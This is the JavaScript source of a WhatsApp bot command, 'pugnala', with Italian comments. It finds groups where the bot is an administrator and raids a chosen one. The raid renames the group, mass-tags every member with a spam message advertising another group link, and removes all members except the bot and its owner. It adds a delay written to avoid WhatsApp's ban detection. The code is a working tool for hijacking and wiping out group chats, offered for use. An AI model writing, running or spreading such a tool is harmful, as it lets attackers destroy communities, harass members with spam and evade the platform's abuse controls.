let handler = async (m, { conn, text }) => {
    // 1. Verifichiamo se l'utente è l'owner
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    // 2. Identifichiamo il numero del bot in modo pulito
    const botNumber = (conn.user.id.split(':')[0] || conn.user.jid.split(':')[0]);

    // --- LOGICA IN PRIVATA ---
    if (!m.isGroup) {
        if (!text) {
            await m.reply("⏳ *BLOOD sta scansionando i server... attendi.*");

            let adminGroups = [];
            try {
                // Proviamo a recuperare tutti i gruppi dalla memoria del bot
                let chats = await conn.groupFetchAllParticipating();
                let ids = Object.keys(chats);

                for (let id of ids) {
                    try {
                        let meta = await conn.groupMetadata(id);
                        // Controlliamo se il bot è admin usando il numero pulito
                        let isBotAdmin = meta.participants.some(p => 
                            p.id.startsWith(botNumber) && (p.admin === 'admin' || p.admin === 'superadmin')
                        );

                        if (isBotAdmin) {
                            adminGroups.push({ id, subject: meta.subject });
                        }
                    } catch (e) { continue; }
                }
            } catch (err) {
                console.error("Errore Fetch:", err);
                return m.reply("❌ Errore critico nel caricamento dei gruppi. Riprova tra poco.");
            }

            if (adminGroups.length === 0) {
                return m.reply("❌ Non ho trovato gruppi in cui sono admin.\n\n*Nota:* Assicurati che io sia amministratore e che il gruppo sia attivo.");
            }

            let txt = "🩸 *𝐋𝐈𝐒𝐓𝐀 𝐁𝐄𝐑𝐒𝐀𝐆𝐋𝐈 𝐁𝐋𝐎𝐎𝐃* 🩸\n\n";
            adminGroups.forEach((g, i) => {
                txt += `*${i + 1}.* ${g.subject}\nID: \`${g.id}\`\n\n`;
            });
            txt += "Copia l'ID e scrivi: `.pugnala [ID]`";
            return m.reply(txt);
        }

        // Se scrivi .pugnala <ID>
        let targetId = text.trim();
        if (!targetId.endsWith('@g.us')) return m.reply("❌ Formato ID non valido.");

        try {
            let meta = await conn.groupMetadata(targetId);
            await m.reply(`⚔️ *TARGET:* ${meta.subject}\nEseguendo il devasto remoto...`);
            await executeDevasto(conn, targetId, meta.participants, botNumber, ownerJids);
            return m.reply("✅ Devasto completato con successo.");
        } catch (e) {
            return m.reply("❌ Impossibile accedere al gruppo con quell'ID.");
        }
    }

    // --- LOGICA IN GRUPPO ---
    try {
        let meta = await conn.groupMetadata(m.chat);
        let isBotAdmin = meta.participants.some(p => p.id.startsWith(botNumber) && p.admin);
        if (!isBotAdmin) return m.reply("❌ Devo essere admin per colpire.");

        await executeDevasto(conn, m.chat, meta.participants, botNumber, ownerJids);
    } catch (e) {
        m.reply("❌ Errore durante l'esecuzione.");
    }
};

async function executeDevasto(conn, chatId, participants, botNumber, ownerJids) {
    try {
        // 1. Cambio Nome
        await conn.groupUpdateSubject(chatId, `𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`).catch(() => {});

        // 2. Messaggi
        let allJids = participants.map(p => p.id);
        await conn.sendMessage(chatId, { 
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎.\n\n𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝.\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri",
            mentions: allJids
        });

        // 3. Rimozione (escludendo bot e owner)
        let toRemove = allJids.filter(jid => 
            !jid.startsWith(botNumber) && 
            !ownerJids.some(owner => jid.startsWith(owner.split('@')[0]))
        );

        for (let user of toRemove) {
            await conn.groupParticipantsUpdate(chatId, [user], 'remove').catch(() => {});
            // Un delay minimo per non essere bannati dai server di WhatsApp
            await new Promise(r => setTimeout(r, 400));
        }
    } catch (e) {
        console.error("Errore Devasto:", e);
    }
}

handler.command = ['pugnala'];
handler.owner = true; // Solo il creatore può usarlo

export default handler;
